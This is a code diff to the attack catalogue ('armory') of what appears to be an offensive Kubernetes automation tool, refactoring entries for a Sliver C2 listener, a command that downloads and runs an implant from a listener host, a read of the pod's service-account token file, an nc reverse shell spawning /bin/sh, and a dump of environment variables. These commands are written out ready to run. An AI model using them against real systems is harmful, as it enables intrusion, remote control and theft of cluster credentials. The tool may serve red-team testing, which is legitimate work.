@@ -111,6 +111,9 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:        "Create Sliver HTTP Listener",
 			Description: "Catch incoming shells",
 			Command:     domain.StartListener{Port: 1337, Protocol: domain.HTTP, Server: "sliver"},
+			Requires: domain.Requirements{
+				Kind: "C2:Sliver",
+			},
 			// Port:        1337,
 		},
 		{
@@ -122,20 +125,14 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:        "Drop & Exec Implant",
 			Description: "Command to download a prepared C2 implant and execute it to establish a session",
 			// Cmd:         "sh -c 'wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause'",
-			Cmd: "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
-			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
-			},
+			Cmd:      "sh -c \"wget $LISTENER:$FILESHARE_PORT/implant -O /tmp/pause && chmod +x /tmp/pause && /tmp/pause &\"",
 			Requires: domain.Requirements{AccessLevel: domain.UserExec},
 		},
 		{
-			Name:        "Read SerivceAccount Token",
-			Description: "Command to download a prepared C2 implant and execute it to establish a session",
-			Cmd:         "get_file",
-			Args:        []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"},
-			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd, Args: t.Args} // , Target: domain.Target{}
-			},
+			Name:          "Read SerivceAccount Token",
+			Description:   "Command to download a prepared C2 implant and execute it to establish a session",
+			Cmd:           "get_file",
+			Args:          []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"},
 			Requires:      domain.Requirements{AccessLevel: domain.UserRead},
 			Effects:       []string{"Pod name", "ServiceAccount name", "Namespace name"},
 			ResultHandler: handleSaTokenRead,
@@ -149,9 +146,8 @@ func LoadArmory(dir string) (Armory, error) {
 			Name:        "Kubectl Exec simple shell",
 			Description: "Use kubectl exec to establish a simple shell",
 			Cmd:         "nc $LISTENER $LISTENER_PORT -e /bin/sh &",
-			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
-			},
+			Tactics:     []string{"Execution"},
+			// Requires:    domain.Requirements{Kind: "Listener"},
 		},
 		// ExecSimpleReverseShell{
 		// 	TTPMeta: TTPMeta{
@@ -179,9 +175,6 @@ func LoadArmory(dir string) (Armory, error) {
 			Description:   "Use kubectl exec to read environment variables of a pod",
 			ResultHandler: handleEnvVarResult,
 			Cmd:           "env",
-			CommandFn: func(t domain.TTP) domain.Message {
-				return domain.ExecTTP{TTP: t, Cmd: t.Cmd} //, Target: domain.Target{}, C2Channel: KubectlExecCmd{}}
-			},
 		},
 	}
 
